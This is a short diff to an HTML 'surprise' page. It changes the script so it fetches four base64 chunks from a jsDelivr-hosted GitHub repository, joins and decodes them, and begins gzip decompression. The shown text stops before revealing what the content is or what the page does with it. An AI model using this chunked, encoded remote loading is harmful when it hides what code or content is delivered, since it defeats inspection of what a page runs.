@@ -9,7 +9,8 @@
 <p id="s">Loading surprise...</p>
 <script>
 async function go(){
-  const parts = await Promise.all(["c0.txt","c1.txt","c2.txt","c3.txt"].map(u => fetch(u).then(r => r.text())));
+  const base = "https://cdn.jsdelivr.net/gh/sadgun-pro/Hbdkt@main/";
+  const parts = await Promise.all(["c0.txt","c1.txt","c2.txt","c3.txt"].map(u => fetch(base+u).then(r => r.text())));
   const b64 = parts.join("");
   const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
   const ds = new DecompressionStream("gzip");
